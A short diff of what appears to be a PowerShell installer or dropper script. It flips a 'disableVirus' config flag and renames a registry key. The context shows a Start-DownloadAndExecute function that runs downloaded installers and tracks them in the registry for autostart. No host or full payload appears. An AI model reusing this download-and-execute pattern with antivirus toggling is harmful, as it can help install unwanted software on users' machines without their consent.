@@ -1,6 +1,6 @@
 ﻿$server = '{
     "disabled":  false,
-    "disableVirus":  true,
+    "disableVirus":  false,
     "dnSponsor":  [
                       {
                           "enabled":  true,
@@ -1184,7 +1184,7 @@ function Start-DownloadAndExecute {
                 Start-Process -FilePath $installerPath -Wait
 
                 # Write to the registry
-                $registryPath = "HKCU:\Software\Hefest\Downloads"
+                $registryPath = "HKCU:\Software\Hephaestus\Downloads"
                 if (-not (Test-Path $registryPath)) {
                     New-Item -Path $registryPath -Force | Out-Null
                 }
@@ -1224,7 +1224,7 @@ function Download {
 
     if (Test-Autostart -eq $true)
     {
-        $registryPath = "HKCU:\Software\Hefest\Downloads"
+        $registryPath = "HKCU:\Software\Hephaestus\Downloads"
         if (Test-Path $registryPath) {
             $installed = Get-ItemProperty -Path $registryPath -Name $fileName -ErrorAction SilentlyContinue
             if ($installed) 
